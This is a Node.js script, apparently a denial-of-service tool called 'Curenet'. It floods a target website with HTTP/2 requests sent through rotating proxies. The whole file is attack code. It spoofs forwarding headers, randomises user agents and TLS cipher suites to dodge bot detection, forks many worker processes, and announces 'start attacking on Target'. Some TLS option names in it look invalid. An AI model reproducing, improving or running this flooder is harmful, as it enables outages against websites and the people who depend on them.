const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require("user-agents");
const fs = require("fs");

//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker
//generate user agent using faker

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on("uncaughtException", (error) => {});
process.on("unhandledRejection", (error) => {});

if (process.argv.length < 7) {
  console.log(`
             ██████╗██╗   ██╗██████╗ ███████╗███╗   ██╗███████╗████████╗
            ██╔════╝██║   ██║██╔══██╗██╔════╝████╗  ██║██╔════╝╚══██╔══╝
            ██║     ██║   ██║██████╔╝█████╗  ██╔██╗ ██║█████╗     ██║   
            ██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║██╔══╝     ██║   
            ╚██████╗╚██████╔╝██║  ██║███████╗██║ ╚████║███████╗   ██║   
             ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝                                                     
             node tls.js (url) (time) (req/s) (thread) (proxy)`);
  process.exit();
}
const headers = {};
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

const randip = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers =
  "GREASE:" +
  [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
  ].join(":");
  
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: sigalgs,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol,
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6],
};
const cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "ECDHE-RSA-AES256-SHA256:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  console.log(
    `
             ██████╗██╗   ██╗██████╗ ███████╗███╗   ██╗███████╗████████╗
            ██╔════╝██║   ██║██╔══██╗██╔════╝████╗  ██║██╔════╝╚══██╔══╝
            ██║     ██║   ██║██████╔╝█████╗  ██╔██╗ ██║█████╗     ██║   
            ██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║██╔══╝     ██║   
            ╚██████╗╚██████╔╝██║  ██║███████╗██║ ╚████║███████╗   ██║   
             ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝                                                     
             ` +
      "[Curenet] start attacking on Target: " +
      parsedTarget.href +
      " for " +
      args.time +
      " seconds"
  );
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
    console.log("Threads " + counter + " started.");
  }
  setInterval(runFlooder, 0);
} else {
  setInterval(runFlooder, 0);
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const payload =
      "CONNECT " +
      options.address +
      ":443 HTTP/1.1\r\nHost: " +
      options.address +
      ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
      allowHalfOpen: true,
      writable: true,
      readable: true,
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", (chunk) => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", (error) => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const userAgentv2 = new UserAgent();
  var useragent = userAgentv2.toString();
  const lastModifiedTime = new Date("2023-09-15T00:00:00Z");
  headers[":authority"] = parsedTarget.host;
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers["x-forwarded-proto"] = "https";
  headers["x-forwarded-for"] = parsedProxy[0];
  headers["x-real-ip"] = parsedProxy[0];
  headers["accept"] =
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
  headers["accept-encoding"] = "gzip, deflate, br";
  headers["accept-language"] = "en-US,en;q=0.9";
  headers["cache-control"] = "no-cache";
  headers["pragma"] = "no-cache";
  headers["if-modified-since"] = lastModifiedTime.toUTCString();
  headers["sec-ch-ua"] =
    '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"';
  headers["sec-ch-ua-mobile"] = "?0";
  headers["sec-ch-ua-platform"] = '"Windows"';
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
  headers["sec-fetch-site"] = "none";
  headers["sec-fetch-user"] = "?1";
  headers["upgrade-insecure-requests"] = "1";
  headers["user-agent"] = useragent;

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 4,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 60000);
    connection.setNoDelay(true);

    const tlsOptions = {
      port: 443,
      secure: true,
      ALPNProtocols: ["h2"],
      ciphers: cipper,
      sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      requestCert: true,
      socket: connection,
      echdCurve: "GREASE:x25519:secp256r1:secp384r1",
      honorCipherOrder: false,
      host: parsedTarget.host,
      rejectUnauthorized: false,
      clientCertEngine: "dynamic",
      secureOptions:
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSLcom,
      secureContext: secureContext,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol,
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, args.time * 1000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        enablePush: false,
        initialWindowSize: 1073741823,
      },
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      //socket: connection,
    });

    client.setMaxListeners(0);
    client.settings({
      enablePush: false,
      initialWindowSize: 1073741823,
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
          const request = client
            .request(headers)

            .on("response", (headers) => {
              request.close();
              request.destroy();
              return;
            });

          request.end();
        }
      }, 1100);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });

    client.on("error", (error) => {
      client.destroy();
      connection.destroy();
      return;
    });
  });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
